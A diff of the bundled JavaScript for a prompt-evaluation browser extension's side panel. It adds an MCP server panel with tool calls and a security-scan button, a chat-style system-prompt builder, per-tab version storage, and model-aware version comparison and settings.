+    if (raw && !raw.classList.contains("hidden")) {
+      const text = raw.value.trim();
+      return text ? JSON.parse(text) : {};
+    }
+    const args = {};
+    for (const f of Array.from(document.querySelectorAll("#mcpFields [data-arg]"))) {
+      const key = f.dataset["arg"];
+      const type = f.dataset["type"];
+      if (!key) continue;
+      if (type === "boolean") {
+        args[key] = f.checked;
+        continue;
+      }
+      const raw2 = f.value.trim();
+      if (raw2 === "") continue;
+      if (type === "number") args[key] = Number(raw2);
+      else if (type === "json") args[key] = JSON.parse(raw2);
+      else args[key] = raw2;
+    }
+    return args;
+  }
+  async function onCall(name) {
+    if (!s.client) return;
+    let args;
+    try {
+      args = readArgs();
+    } catch {
+      setHtml("mcpToolResult", '<div class="mcp-err">Arguments are not valid JSON.</div>');
+      return;
+    }
+    setHtml("mcpToolResult", `Calling <code>${escapePre(name)}</code>\u2026`);
+    try {
+      const res = await s.client.callTool(name, args);
+      const cls = res.isError ? "mcp-err" : "mcp-ok";
+      setHtml("mcpToolResult", `<div class="${cls} mcp-result"><pre>${escapePre(res.text || JSON.stringify(res.content, null, 2))}</pre></div>`);
+    } catch (err) {
+      setHtml("mcpToolResult", `<div class="mcp-err mcp-result"><pre>${escapePre(err instanceof Error ? err.message : String(err))}</pre></div>`);
+    }
+  }
+  async function onScan() {
+    if (!s.client) {
+      status("Connect to a server first.", "error");
+      return;
+    }
+    if (!s.scanned && !confirm(`Run the security scan? This sends many adversarial calls to ${s.tools.length} live tool(s) \u2014 real side effects.`)) {
+      return;
+    }
+    s.scanned = true;
+    status(`Running security scan over ${s.tools.length} tool(s)\u2026`);
+    try {
+      const report = await runSecurityScan(s.client, s.tools);
+      setHtml("mcpSecurity", securityReportHtml(report));
+      status("Security scan complete.");
+    } catch (err) {
+      status(`Scan failed: ${err instanceof Error ? err.message : String(err)}`, "error");
+    }
+  }
+  function escapePre(str) {
+    return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  }
+  async function onForget() {
+    const settings = await loadSettings(area);
+    await saveSettings(area, { ...settings, mcpServers: [] });
+    for (const id of ["mcpName", "mcpUrl", "mcpAuth"]) {
+      const e = $(id);
+      if (e) e.value = "";
+    }
+    const t = $("mcpTransport");
+    if (t) t.value = "http";
+    toStage1();
+    status("Saved server forgotten.");
+  }
+  async function restore() {
+    const saved = (await loadSettings(area)).mcpServers?.[0];
+    if (!saved) return;
+    const set = (id, val) => {
+      const e = $(id);
+      if (e) e.value = val;
+    };
+    set("mcpName", saved.name);
+    set("mcpUrl", saved.url);
+    set("mcpTransport", saved.transport);
+    if (saved.authHeader) set("mcpAuth", saved.authHeader);
+  }
+  function initMcpPanel(nav = { onBack: () => {
+  } }) {
+    if (!$("mcpConnectBtn")) return;
+    onBack = nav.onBack;
+    setConn("disconnected");
+    $("mcpConnectBtn")?.addEventListener("click", () => void onConnect());
+    $("mcpScanBtn")?.addEventListener("click", () => void onScan());
+    $("mcpForgetBtn")?.addEventListener("click", () => void onForget());
+    $("mcpBackBtn")?.addEventListener("click", () => onBack());
+    $("mcpCatalog")?.addEventListener("click", (e) => {
+      const li = e.target.closest(".mcp-tool");
+      if (li?.dataset["tool"]) selectTool(li.dataset["tool"]);
+    });
+    for (const btn of Array.from(document.querySelectorAll(".mcptab"))) {
+      btn.addEventListener("click", () => {
+        s.cat = btn.dataset["cat"] ?? "tools";
+        renderTabs();
+        renderCatalog();
+      });
+    }
+    void restore();
+  }
+
   // src/ui/sidepanel.ts
   var STEPS = ["capture", "analyze", "evalprompt", "cases", "run", "results", "fixes", "versions"];
+  var VIEWS = [...STEPS, "generate", "mcp"];
   var DEFAULT_CASE_COUNT = 12;
   var MORE_CASE_COUNT = 10;
   var TOOL_CASE_COUNT = 6;
-  var area = chromeLocal();
+  var area2 = chromeLocal();
   var session = chromeSession();
-  var store = new IndexedDbStore();
+  async function resolveVersionKey() {
+    try {
+      const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
+      return versionKeyForTab(tabs[0]?.id);
+    } catch {
+      return versionKeyForTab(void 0);
+    }
+  }
+  var store = new SessionTabStore(session, resolveVersionKey);
   var state = {
     prompt: "",
     target: parseTarget(DEFAULT_TARGET_VALUE),
@@ -5990,9 +7177,9 @@ ${c?.input ?? ""}
     }
     if (state.tools.length) {
       el("toolDefs").value = JSON.stringify(state.tools, null, 2);
-      const status = el("toolDefsStatus");
-      status.textContent = `\u2713 ${state.tools.length} tool${state.tools.length === 1 ? "" : "s"} defined`;
-      status.className = "toolstatus ok";
+      const status2 = el("toolDefsStatus");
+      status2.textContent = `\u2713 ${state.tools.length} tool${state.tools.length === 1 ? "" : "s"} defined`;
+      status2.className = "toolstatus ok";
     }
     populateExpectedToolSelect();
   }
@@ -6048,7 +7235,7 @@ ${c?.input ?? ""}
     el(id).innerHTML = markup;
   };
   function show(step) {
-    for (const s of STEPS) el(`view-${s}`).classList.toggle("hidden", s !== step);
+    for (const s2 of VIEWS) el(`view-${s2}`).classList.toggle("hidden", s2 !== step);
     const rail = el("rail").children;
     const idx = STEPS.indexOf(step);
     for (let i = 0; i < rail.length; i++) {
@@ -6056,16 +7243,16 @@ ${c?.input ?? ""}
     }
   }
   function setMessage(text, kind = "info") {
-    const msg = el("msg");
-    msg.textContent = text;
-    msg.classList.toggle("hidden", text === "");
-    msg.classList.toggle("error", kind === "error");
+    const msg2 = el("msg");
+    msg2.textContent = text;
+    msg2.classList.toggle("hidden", text === "");
+    msg2.classList.toggle("error", kind === "error");
   }
   function targetValue() {
     return el("target").value;
   }
   async function wiring() {
-    const settings = await loadSettings(area);
+    const settings = await loadSettings(area2);
     const target = parseTarget(targetValue());
     const w = buildWiring(settings, target, getProvider);
     return { settings, target, w };
@@ -6075,7 +7262,7 @@ ${c?.input ?? ""}
   }
   async function refreshKeyState() {
     const provider = currentProvider();
-    const settings = await loadSettings(area);
+    const settings = await loadSettings(area2);
     const hasKey = Boolean(settings.keys[provider]);
     el("keybox").classList.toggle("hidden", hasKey);
     el("keyLabel").textContent = `Your ${provider} key (stored only in this browser)`;
@@ -6085,7 +7272,7 @@ ${c?.input ?? ""}
     const value = el("apiKey").value.trim();
     if (!value) return setMessage("Enter a key first.", "error");
     try {
-      await setKey(area, currentProvider(), value);
+      await setKey(area2, currentProvider(), value);
       el("apiKey").value = "";
       setMessage("");
       await refreshKeyState();
@@ -6166,8 +7353,15 @@ ${c?.input ?? ""}
     state.mode = mode;
     el("modeQuality").setAttribute("aria-pressed", String(mode === "quality"));
     el("modeTools").setAttribute("aria-pressed", String(mode === "tools"));
+    el("modeMcp").setAttribute("aria-pressed", "false");
     el("analyzeBtn").textContent = mode === "tools" ? "Set up tool & agent tests \u2192" : "Analyze prompt \u2192";
     persistSession();
+  }
+  function onMcpMode() {
+    el("modeQuality").setAttribute("aria-pressed", "false");
+    el("modeTools").setAttribute("aria-pressed", "false");
+    el("modeMcp").setAttribute("aria-pressed", "true");
+    show("mcp");
   }
   function onCapturePrimary() {
     if (state.mode === "tools") void onToToolTests();
@@ -6187,6 +7381,97 @@ ${c?.input ?? ""}
     persistSession();
     await renderCasesView();
     el("toolPanel").open = true;
+  }
+  var builderLog = [];
+  var builderConversation = [];
+  var builderGenerated = "";
+  var builderPending = false;
+  var BUILDER_GREETING = "Tell me what you want this assistant to do \u2014 its job, who it's for, and anything it must always or never do. I'll ask a couple of questions, then write the prompt.";
+  var BUILDER_PENDING_BUBBLE = '<div class="bub lit pending" aria-label="litmus is thinking"><span class="dots"><i></i><i></i><i></i></span></div>';
+  function renderBuilderLog() {
+    html("builderLog", builderLogHtml(builderLog) + (builderPending ? BUILDER_PENDING_BUBBLE : ""));
+    const log = el("builderLog");
+    log.scrollTop = log.scrollHeight;
+  }
+  function openBuilder() {
+    setMessage("");
+    if (builderLog.length === 0) builderLog = [{ who: "litmus", text: BUILDER_GREETING }];
+    renderBuilderLog();
+    show("generate");
+  }
+  function applyBuilderTurn(turn) {
+    builderConversation.push({ role: "assistant", content: JSON.stringify(turn) });
+    if (turn.kind === "question") {
+      builderLog.push({ who: "litmus", text: turn.message, suggestions: turn.suggestions });
+      el("builderResultWrap").classList.add("hidden");
+      el("builderUseRow").classList.add("hidden");
+    } else {
+      builderGenerated = turn.systemPrompt;
+      if (turn.summary) builderLog.push({ who: "litmus", text: turn.summary });
+      el("builderResult").value = turn.systemPrompt;
+      el("builderResultWrap").classList.remove("hidden");
+      el("builderUseRow").classList.remove("hidden");
+    }
+    renderBuilderLog();
+  }
+  async function runBuilderTurn(forceGenerate) {
+    let ctx;
+    try {
+      ctx = await wiring();
+    } catch (e) {
+      el("keybox").classList.remove("hidden");
+      show("capture");
+      return setMessage(e instanceof Error ? e.message : "Add an API key in settings first.", "info");
+    }
+    state.target = ctx.target;
+    const btnId = forceGenerate ? "builderGenerateBtn" : "builderSendBtn";
+    const done = busy(btnId, forceGenerate ? "Writing\u2026" : "Thinking\u2026");
+    builderPending = true;
+    renderBuilderLog();
+    try {
+      const turn = await builderTurn(
+        builderConversation,
+        { provider: ctx.w.targetProvider, apiKey: ctx.w.targetKey, model: ctx.target.model },
+        forceGenerate
+      );
+      builderPending = false;
+      applyBuilderTurn(turn);
+    } catch (err) {
+      builderPending = false;
+      renderBuilderLog();
+      setMessage(describeError(err), "error");
+    } finally {
+      done();
+    }
+  }
+  function pushBuilderInput() {
+    const input = el("builderInput").value.trim();
+    if (!input) return false;
+    builderLog.push({ who: "you", text: input });
+    builderConversation.push({ role: "user", content: input });
+    el("builderInput").value = "";
+    renderBuilderLog();
+    return true;
+  }
+  async function onBuilderSend() {
+    setMessage("");
+    if (!pushBuilderInput()) return setMessage("Type what you want the prompt to do.", "error");
+    await runBuilderTurn(false);
+  }
+  async function onBuilderGenerate() {
+    setMessage("");
+    pushBuilderInput();
+    if (builderConversation.length === 0) return setMessage("Describe the prompt first, then generate.", "error");
+    await runBuilderTurn(true);
+  }
+  function onBuilderUse() {
+    const text = el("builderResult").value.trim() || builderGenerated;
+    if (!text) return setMessage("Generate a prompt first.", "error");
+    state.prompt = text;
+    el("prompt").value = text;
+    show("capture");
+    void refreshVersionPicker();
+    setMessage("Loaded your generated prompt \u2014 analyze or run it.");
   }
   async function onAnalyze() {
     setMessage("");
@@ -6208,7 +7493,7 @@ ${c?.input ?? ""}
       });
       el("analyzeKicker").textContent = `How it reads on ${ctx.target.model}`;
       html("facets", facetRowsHtml(state.analysis.facets));
-      html("suggest", state.analysis.suggestions.map((s) => `<div class="sd">\u2726 ${s}</div>`).join(""));
+      html("suggest", state.analysis.suggestions.map((s2) => `<div class="sd">\u2726 ${s2}</div>`).join(""));
       persistSession();
       show("analyze");
     } catch (err) {
@@ -6301,6 +7586,8 @@ ${c?.input ?? ""}
       }
       state.rubrics = { ...state.rubrics, [name]: rubric };
       input.value = "";
+      el("coverageHost").innerHTML = "";
+      el("coverageHost").classList.add("hidden");
       selectDimension(name);
     } catch (err) {
       setMessage(describeError(err), "error");
@@ -6341,13 +7628,22 @@ ${c?.input ?? ""}
   }
   async function onCheckCoverage() {
     if (state.dimensions.length === 0) return;
+    const host = el("coverageHost");
+    if (!host.classList.contains("hidden")) {
+      host.classList.add("hidden");
+      return;
+    }
+    if (host.innerHTML.trim()) {
+      host.classList.remove("hidden");
+      return;
+    }
     setMessage("");
     const done = busy("coverageBtn", "Checking\u2026");
     try {
       const ctx = await wiring();
       const rows = await analyzeCoverage(state.prompt, state.dimensions.map((d) => d.name), suiteDeps(ctx));
       html("coverageHost", coverageHtml(rows));
-      el("coverageHost").classList.remove("hidden");
+      host.classList.remove("hidden");
     } catch (err) {
       setMessage(describeError(err), "error");
     } finally {
@@ -6371,24 +7667,38 @@ ${c?.input ?? ""}
   async function renderCasesView() {
     html("casesHost", casesListHtml(state.cases));
     const { settings, target, w } = await wiring();
-    const est = estimateRun({
-      caseCount: state.cases.length * Math.max(1, settings.samples),
+    const toolsMode = state.mode === "tools";
+    const samples = Math.max(1, settings.samples);
+    const est = toolsMode ? estimateRun({
+      caseCount: state.cases.reduce((n, c) => n + (c.scenario ? c.scenario.maxSteps : 1), 0) * samples,
+      targetModel: target.model,
+      judgeModel: w.auxModel,
+      analyzerModel: w.auxModel,
+      includeAnalysis: false,
+      includeEvalGen: false,
+      includeJudge: false,
+      includeFixes: false,
+      avgInputTokens: 600,
+      avgOutputTokens: 400
+    }) : estimateRun({
+      caseCount: state.cases.length * samples,
       targetModel: target.model,
       judgeModel: w.auxModel,
       analyzerModel: w.auxModel,
       includeAnalysis: false,
       includeEvalGen: false,
       includeFixes: true,
+      judgeSamples: settings.judgeSamples,
       avgInputTokens: 600,
       avgOutputTokens: 400
     });
     const over = exceedsCap(est, settings.spendCapUsd);
     el("costLine").textContent = `${formatUsd(est.estUsd)} \xB7 ${est.totalCalls} calls \xB7 cap ${formatUsd(settings.spendCapUsd)}`;
     el("runBtn").disabled = over;
-    const toolsMode = state.mode === "tools";
     el("regenBtn").classList.toggle("hidden", toolsMode);
     el("moreCasesBtn").classList.toggle("hidden", toolsMode);
-    el("agentPanel").classList.toggle("hidden", false);
+    el("toolPanel").classList.toggle("hidden", !toolsMode);
+    el("agentPanel").classList.toggle("hidden", !toolsMode);
     setMessage(over ? "Estimated cost exceeds your cap. Raise the cap or trim cases." : "", over ? "error" : "info");
     show("cases");
     return over;
@@ -6494,23 +7804,23 @@ ${existing}`
   }
   function onToolDefsChanged() {
     const raw = el("toolDefs").value.trim();
-    const status = el("toolDefsStatus");
+    const status2 = el("toolDefsStatus");
     if (!raw) {
       state.tools = [];
-      status.textContent = "";
-      status.className = "toolstatus";
+      status2.textContent = "";
+      status2.className = "toolstatus";
       populateExpectedToolSelect();
       persistSession();
       return;
     }
     try {
       state.tools = ToolDefsSchema.parse(JSON.parse(raw));
-      status.textContent = `\u2713 ${state.tools.length} tool${state.tools.length === 1 ? "" : "s"} defined`;
-      status.className = "toolstatus ok";
+      status2.textContent = `\u2713 ${state.tools.length} tool${state.tools.length === 1 ? "" : "s"} defined`;
+      status2.className = "toolstatus ok";
     } catch (err) {
       state.tools = [];
-      status.textContent = err instanceof SyntaxError ? "Invalid JSON" : "Tool defs must be [{name, parameters}]";
-      status.className = "toolstatus err";
+      status2.textContent = err instanceof SyntaxError ? "Invalid JSON" : "Tool defs must be [{name, parameters}]";
+      status2.className = "toolstatus err";
     }
     populateExpectedToolSelect();
     persistSession();
@@ -6519,7 +7829,7 @@ ${existing}`
     const input = el("toolCaseInput").value.trim();
     if (!input) return setMessage("Add a user message for the tool test.", "error");
     const expectedTool = el("toolExpected").value;
-    const forbidden = el("toolForbidden").value.split(",").map((s) => s.trim()).filter(Boolean);
+    const forbidden = el("toolForbidden").value.split(",").map((s2) => s2.trim()).filter(Boolean);
     const argsRaw = el("toolRequiredArgs").value.trim();
     let requiredArgs;
     if (argsRaw) {
@@ -6544,22 +7854,22 @@ ${existing}`
   }
   async function onAddScenario() {
     const raw = el("scenarioJson").value.trim();
-    const status = el("scenarioStatus");
+    const status2 = el("scenarioStatus");
     if (!raw) {
-      status.textContent = "Paste a scenario JSON first.";
-      status.className = "toolstatus err";
+      status2.textContent = "Paste a scenario JSON first.";
+      status2.className = "toolstatus err";
       return;
     }
     let scenario;
     try {
       scenario = ScenarioSchema.parse(JSON.parse(raw));
     } catch (err) {
-      status.textContent = err instanceof SyntaxError ? "Invalid JSON" : "Scenario needs goal, tools[], and maxSteps (1\u201320).";
-      status.className = "toolstatus err";
+      status2.textContent = err instanceof SyntaxError ? "Invalid JSON" : "Scenario needs goal, tools[], and maxSteps (1\u201320).";
+      status2.className = "toolstatus err";
       return;
     }
-    status.textContent = `\u2713 scenario "${scenario.goal.slice(0, 40)}${scenario.goal.length > 40 ? "\u2026" : ""}" added`;
-    status.className = "toolstatus ok";
+    status2.textContent = `\u2713 scenario "${scenario.goal.slice(0, 40)}${scenario.goal.length > 40 ? "\u2026" : ""}" added`;
+    status2.className = "toolstatus ok";
     state.cases = [...state.cases, { id: nextCaseId(), category: "typical", input: scenario.goal, pinned: false, scenario }];
     el("scenarioJson").value = "";
     persistSession();
@@ -6588,34 +7898,44 @@ ${existing}`
         rubric: combineRubrics(state.rubrics) || void 0,
         passThreshold: settings.passThreshold,
         samples: settings.samples,
-        ...state.tools.length ? { tools: state.tools } : {}
+        judgeSamples: settings.judgeSamples,
+        concurrency: settings.concurrency,
+        ...state.tools.length ? { tools: state.tools } : {},
+        ...settings.mcpServers?.length ? { mcpServers: settings.mcpServers } : {}
       });
       state.outcome = outcome;
-      const combined = combineRubrics(state.rubrics) || void 0;
-      state.rubricHealth = await validateRubric(state.prompt, state.cases, outcome.results, {
-        provider: w.judgeProvider,
-        apiKey: w.judgeKey,
-        model: w.auxModel,
-        rubric: combined
-      }).catch(() => null);
+      if (state.mode === "tools") {
+        state.rubricHealth = null;
+      } else {
+        const combined = combineRubrics(state.rubrics) || void 0;
+        state.rubricHealth = await validateRubric(state.prompt, state.cases, outcome.results, {
+          provider: w.judgeProvider,
+          apiKey: w.judgeKey,
+          model: w.auxModel,
+          rubric: combined
+        }).catch(() => null);
+      }
       const existing = await store.getVersions();
       const index = existing.length + 1;
       const prev = existing[existing.length - 1];
-      const note = index === 1 ? "baseline" : prev && prev.text === state.prompt ? "re-run (no change)" : "edited prompt";
+      const samePrompt = Boolean(prev && prev.text === state.prompt);
+      const modelChanged = Boolean(prev?.target && prev.target.model !== target.model);
+      const note = index === 1 ? "baseline" : samePrompt ? modelChanged ? `same prompt \xB7 ${target.model}` : "re-run (no change)" : "edited prompt";
       const version = {
         id: `v${index}`,
         index,
         text: state.prompt,
         note,
         parentId: state.lastVersionId,
-        createdAt: Date.now()
+        createdAt: Date.now(),
+        target: { provider: target.provider, model: target.model }
       };
       await store.putVersion(version);
       await store.putRun({
         versionId: version.id,
         summary: outcome.summary,
         results: outcome.results,
-        dimensions: aggregateDimensions(outcome.results),
+        dimensions: aggregateDimensions2(outcome.results),
         ...state.rubricHealth ? { rubricHealth: state.rubricHealth } : {},
         createdAt: version.createdAt
       });
@@ -6628,13 +7948,18 @@ ${existing}`
     }
   }
   function renderResults(versionIndex) {
-    const s = state.outcome.summary;
-    const b = band(s.overall);
+    if (!state.outcome) {
+      setMessage("No run to show \u2014 run an eval first.", "info");
+      show("cases");
+      return;
+    }
+    const s2 = state.outcome.summary;
+    const b = band(s2.overall);
     html(
       "scoreHost",
-      `<div class="scorehero"><div class="big ${b}">${s.overall.toFixed(1)}</div><div class="sx"><div class="sk">Overall \xB7 v${versionIndex}</div><div class="sv">${s.passCount} passed \xB7 ${s.failCount} failed</div></div></div>`
+      `<div class="scorehero"><div class="big ${b}">${s2.overall.toFixed(1)}</div><div class="sx"><div class="sk">Overall \xB7 v${versionIndex}</div><div class="sv">${s2.passCount} passed \xB7 ${s2.failCount} failed</div></div></div>`
     );
-    html("speedHost", speedStripHtml(s.speed));
+    html("speedHost", speedStripHtml(s2.speed));
     const rubricNode = el("rubricHost");
     if (state.rubricHealth) {
       rubricNode.classList.remove("hidden");
@@ -6643,6 +7968,9 @@ ${existing}`
       rubricNode.classList.add("hidden");
     }
     html("resultsHost", resultsTableHtml(state.outcome.results, 6, state.cases));
+    const toolsMode = state.mode === "tools";
+    el("fixBtn").classList.toggle("hidden", toolsMode);
+    el("resultsVersionsBtn").classList.toggle("btn-primary-promote", toolsMode);
   }
   async function onFixes() {
     const done = busy("fixBtn", "Thinking\u2026");
@@ -6686,49 +8014,81 @@ ${existing}`
       done();
     }
   }
-  async function showVersions() {
+  var axisVersions = [];
+  var axisRuns = /* @__PURE__ */ new Map();
+  var versionsReturnTo = "results";
+  async function showVersions(from = "results") {
+    versionsReturnTo = from;
     const versions = await store.getVersions();
-    const runs = /* @__PURE__ */ new Map();
+    axisVersions = versions;
+    axisRuns.clear();
     const vms = [];
     let prev = null;
-    for (const v of versions) {
-      const run = await store.getRun(v.id);
-      runs.set(v.id, run);
+    for (const v2 of versions) {
+      const run = await store.getRun(v2.id);
+      axisRuns.set(v2.id, run);
       const overall = run?.summary.overall ?? 0;
       vms.push({
-        label: `v${v.index}`,
-        note: v.note,
+        label: `v${v2.index}`,
+        note: v2.note,
         overall,
         passLabel: run ? `${run.summary.passCount}/${run.summary.total}` : "\u2014",
         avgSeconds: run ? round1(run.summary.speed.avgResponseMs / 1e3) : 0,
         delta: prev === null ? null : round1(overall - prev),
-        current: v.id === state.lastVersionId
+        current: v2.id === state.lastVersionId,
+        ...v2.target ? { model: v2.target.model } : {}
       });
       prev = overall;
     }
     html("versionsHost", versionsTimelineHtml(vms));
-    const first = versions[0];
-    const last = versions[versions.length - 1];
-    const firstDims = first ? runs.get(first.id)?.dimensions ?? [] : [];
-    const lastDims = last ? runs.get(last.id)?.dimensions ?? [] : [];
-    const axisWrap = el("axisWrap");
-    if (versions.length >= 2 && firstDims.length > 0 && lastDims.length > 0) {
-      html("axisHost", axisRowsHtml(buildAxis(firstDims, lastDims)));
-      axisWrap.classList.remove("hidden");
-    } else {
-      axisWrap.classList.add("hidden");
-    }
+    fillCompareSelect(el("compareA"), versions[0]?.id ?? "");
+    fillCompareSelect(el("compareB"), versions[versions.length - 1]?.id ?? "");
+    renderAxisPair();
     show("versions");
+  }
+  function fillCompareSelect(sel, selectedId) {
+    sel.replaceChildren();
+    for (const v2 of axisVersions) {
+      const opt = document.createElement("option");
+      opt.value = v2.id;
+      const model = v2.target ? ` \xB7 ${v2.target.model}` : "";
+      opt.textContent = `v${v2.index}${model}`;
+      sel.appendChild(opt);
+    }
+    sel.value = selectedId;
+  }
+  function renderAxisPair() {
+    const axisWrap = el("axisWrap");
+    const aId = el("compareA").value;
+    const bId = el("compareB").value;
+    const a = axisVersions.find((v2) => v2.id === aId);
+    const b = axisVersions.find((v2) => v2.id === bId);
+    const aDims = a ? axisRuns.get(a.id)?.dimensions ?? [] : [];
+    const bDims = b ? axisRuns.get(b.id)?.dimensions ?? [] : [];
+    if (!a || !b || a.id === b.id || aDims.length === 0 || bDims.length === 0) {
+      axisWrap.classList.add("hidden");
+      return;
+    }
+    const cmp = describeComparison(
+      { label: `v${a.index}`, promptText: a.text, ...a.target ? { model: a.target.model } : {} },
+      { label: `v${b.index}`, promptText: b.text, ...b.target ? { model: b.target.model } : {} }
+    );
+    el("axisHeader").textContent = cmp.header;
+    el("axisKeyA").textContent = `\u25C0 v${a.index}`;
+    el("axisKeyB").textContent = `v${b.index} \u25B6`;
+    html("axisHost", axisRowsHtml(buildAxis(aDims, bDims)));
+    axisWrap.classList.remove("hidden");
   }
   async function reportEntries() {
     const versions = await store.getVersions();
     const entries = [];
-    for (const v of versions) {
-      const run = await store.getRun(v.id);
+    for (const v2 of versions) {
+      const run = await store.getRun(v2.id);
       entries.push({
-        label: `v${v.index}`,
-        note: v.note,
-        prompt: v.text,
+        label: `v${v2.index}`,
+        note: v2.note,
+        prompt: v2.text,
+        ...v2.target ? { model: v2.target.model } : {},
         run: run ? {
           overall: run.summary.overall,
           passCount: run.summary.passCount,
@@ -6764,16 +8124,16 @@ ${existing}`
     sessionVersions = [...await store.getVersions()];
     const wrap = el("versionPickerWrap");
     const sel = el("versionPicker");
-    const loadable = sessionVersions.filter((v) => v.text !== state.prompt);
+    const loadable = sessionVersions.filter((v2) => v2.text !== state.prompt);
     if (loadable.length === 0) {
       wrap.classList.add("hidden");
       return;
     }
     const scores = /* @__PURE__ */ new Map();
     await Promise.all(
-      loadable.map(async (v) => {
-        const run = await store.getRun(v.id);
-        if (run) scores.set(v.id, run.summary.overall);
+      loadable.map(async (v2) => {
+        const run = await store.getRun(v2.id);
+        if (run) scores.set(v2.id, run.summary.overall);
       })
     );
     sel.replaceChildren();
@@ -6782,12 +8142,13 @@ ${existing}`
     placeholder.textContent = "Load a different version\u2026";
     sel.appendChild(placeholder);
     for (let i = loadable.length - 1; i >= 0; i--) {
-      const v = loadable[i];
-      if (!v) continue;
-      const score = scores.has(v.id) ? ` \xB7 ${round1(scores.get(v.id))}/10` : "";
+      const v2 = loadable[i];
+      if (!v2) continue;
+      const score = scores.has(v2.id) ? ` \xB7 ${round1(scores.get(v2.id))}/10` : "";
+      const model = v2.target ? ` \xB7 ${v2.target.model}` : "";
       const opt = document.createElement("option");
-      opt.value = v.id;
-      opt.textContent = `v${v.index} \xB7 ${v.note}${score}`;
+      opt.value = v2.id;
+      opt.textContent = `v${v2.index} \xB7 ${v2.note}${model}${score}`;
       sel.appendChild(opt);
     }
     sel.value = "";
@@ -6795,16 +8156,16 @@ ${existing}`
   }
   function onPickVersion() {
     const sel = el("versionPicker");
-    const v = sessionVersions.find((x) => x.id === sel.value);
-    if (!v) return;
+    const v2 = sessionVersions.find((x) => x.id === sel.value);
+    if (!v2) return;
     const promptEl = el("prompt");
-    const identical = promptEl.value === v.text;
-    state.prompt = v.text;
-    promptEl.value = v.text;
+    const identical = promptEl.value === v2.text;
+    state.prompt = v2.text;
+    promptEl.value = v2.text;
     persistSession();
     void refreshVersionPicker();
     setMessage(
-      identical ? `v${v.index}'s prompt is identical to the one already shown \u2014 nothing changed.` : `Loaded v${v.index} \u2014 edit and re-run to branch from it.`
+      identical ? `v${v2.index}'s prompt is identical to the one already shown \u2014 nothing changed.` : `Loaded v${v2.index} \u2014 edit and re-run to branch from it.`
     );
   }
   function setSettingsMsg(text, kind = "info") {
@@ -6814,10 +8175,10 @@ ${existing}`
     m.classList.toggle("error", kind === "error");
   }
   async function openSettings() {
-    const s = await loadSettings(area);
+    const s2 = await loadSettings(area2);
     const savedMark = (provider, id) => {
       const span = el(id);
-      const has = Boolean(s.keys[provider]);
+      const has = Boolean(s2.keys[provider]);
       span.textContent = has ? "saved" : "";
       span.className = `ksaved${has ? " on" : ""}`;
     };
@@ -6827,26 +8188,28 @@ ${existing}`
     el("keyOpenai").value = "";
     el("keyAnthropic").value = "";
     el("keyGoogle").value = "";
-    el("keyOpenai").placeholder = s.keys.openai ? "leave blank to keep" : "sk-\u2026";
-    el("keyAnthropic").placeholder = s.keys.anthropic ? "leave blank to keep" : "sk-ant-\u2026";
-    el("keyGoogle").placeholder = s.keys.google ? "leave blank to keep" : "AIza\u2026";
+    el("keyOpenai").placeholder = s2.keys.openai ? "leave blank to keep" : "sk-\u2026";
+    el("keyAnthropic").placeholder = s2.keys.anthropic ? "leave blank to keep" : "sk-ant-\u2026";
+    el("keyGoogle").placeholder = s2.keys.google ? "leave blank to keep" : "AIza\u2026";
     const dm = el("defaultModel");
-    fillTargetSelect(dm, s);
-    dm.value = defaultValue(s);
+    fillTargetSelect(dm, s2);
+    dm.value = defaultValue(s2);
     const jm = el("judgeModel");
-    fillJudgeSelect(jm, s);
-    const judgeId = s.judgeModel?.includes("/") ? s.judgeModel.slice(s.judgeModel.indexOf("/") + 1) : s.judgeModel ?? "";
+    fillJudgeSelect(jm, s2);
+    const judgeId = s2.judgeModel?.includes("/") ? s2.judgeModel.slice(s2.judgeModel.indexOf("/") + 1) : s2.judgeModel ?? "";
     jm.value = judgeId;
-    el("customModel").value = s.customModel ?? "";
-    el("passThreshold").value = String(s.passThreshold);
-    el("spendCap").value = String(s.spendCapUsd);
-    el("samples").value = String(s.samples);
+    el("customModel").value = s2.customModel ?? "";
+    el("passThreshold").value = String(s2.passThreshold);
+    el("spendCap").value = String(s2.spendCapUsd);
+    el("samples").value = String(s2.samples);
+    el("judgeSamples").value = String(s2.judgeSamples);
+    el("concurrency").value = String(s2.concurrency);
     setSettingsMsg("");
     el("settingsModal").classList.remove("hidden");
   }
   async function onSaveSettings() {
     try {
-      const current = await loadSettings(area);
+      const current = await loadSettings(area2);
       const customRaw = el("customModel").value.trim();
       if (customRaw) {
         try {
@@ -6866,9 +8229,11 @@ ${existing}`
         customModel: customRaw,
         passThreshold: Number(el("passThreshold").value),
         spendCapUsd: Number(el("spendCap").value),
-        samples: Number(el("samples").value)
+        samples: Number(el("samples").value),
+        judgeSamples: Number(el("judgeSamples").value),
+        concurrency: Number(el("concurrency").value)
       });
-      await saveSettings(area, next);
+      await saveSettings(area2, next);
       const targetSel = el("target");
       fillTargetSelect(targetSel, next);
       targetSel.value = defaultValue(next);
@@ -6881,18 +8246,18 @@ ${existing}`
     }
   }
   async function onLoadModels() {
-    const s = await loadSettings(area);
-    const providers = ["openai", "anthropic", "google"].filter((p) => s.keys[p]);
+    const s2 = await loadSettings(area2);
+    const providers = ["openai", "anthropic", "google"].filter((p) => s2.keys[p]);
     if (providers.length === 0) return setSettingsMsg("Save at least one API key first.", "error");
     setSettingsMsg("Loading models from your key(s)\u2026");
-    const available = { ...s.availableModels };
+    const available = { ...s2.availableModels };
     try {
       for (const p of providers) {
-        const key = s.keys[p];
+        const key = s2.keys[p];
         if (key) available[p] = await fetchModels(p, key);
       }
-      const next = { ...s, availableModels: available };
-      await saveSettings(area, next);
+      const next = { ...s2, availableModels: available };
+      await saveSettings(area2, next);
       fillTargetSelect(el("defaultModel"), next);
       el("defaultModel").value = defaultValue(next);
       const jm = el("judgeModel");
@@ -6904,15 +8269,15 @@ ${existing}`
     }
   }
   async function onDeleteKeys() {
-    await deleteAllKeys(area);
+    await deleteAllKeys(area2);
     setSettingsMsg("All keys deleted.");
     await openSettings();
   }
   async function applyDefaults() {
-    const s = await loadSettings(area);
+    const s2 = await loadSettings(area2);
     const targetSel = el("target");
-    fillTargetSelect(targetSel, s);
-    targetSel.value = defaultValue(s);
+    fillTargetSelect(targetSel, s2);
+    targetSel.value = defaultValue(s2);
     if (!targetSel.value) targetSel.value = DEFAULT_TARGET_VALUE;
     state.target = parseTarget(targetSel.value || DEFAULT_TARGET_VALUE);
     await refreshKeyState();
@@ -6928,8 +8293,32 @@ ${existing}`
     wirePacks();
